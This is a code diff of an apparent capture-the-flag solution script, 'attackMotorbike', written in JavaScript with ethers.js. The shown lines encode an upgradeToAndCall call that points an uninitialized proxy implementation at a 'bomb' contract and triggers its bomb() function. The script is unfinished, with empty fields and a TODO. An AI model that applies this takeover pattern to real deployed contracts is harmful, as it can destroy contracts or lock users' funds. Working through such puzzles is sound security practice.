@@ -35,22 +35,17 @@ const attackMotorbike = async () => {
     /*Private Keys in .env file or hardcode here*/
     const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
     const wallet = new Wallet(PRIVATE_KEY, provider);
-    const params = playerAddress;
-    const funcSign = ["function initialize() external initializer"];
-    const iface = new ethers.utils.Interface(funcSign);
-    const data = iface.encodeFunctionData("initialize()");
-    const tx = await wallet.sendTransaction({
-        from: playerAddress,
-        to: implAddress1,
-        data: data,
-    });
-    const txReceipt = await tx.wait();
     // TODO: check upgrader is now player
     const funcSignBomb = ["function bomb() public"];
     const ifaceBomb = new ethers.utils.Interface(funcSignBomb);
     const bombDAta = ifaceBomb.encodeFunctionData("bomb()");
-    const upgradeSignature = "";
-    const upgradeParams = [bombDAta, upgradeSignature];
+    const upgradeParams = [bombAddress, bombDAta];
+    const funcSignUpgrade = [
+        "function upgradeToAndCall(address newImplementation, bytes memory data) external payable",
+    ];
+    const ifaceUpgrade = new ethers.utils.Interface(funcSignUpgrade);
+    const upgradeSignature = ifaceUpgrade.encodeFunctionData("upgradeToAndCall", upgradeParams);
+
     const upgradeData = "";
     const tx1 = await wallet.sendTransaction({
         from: playerAddress,
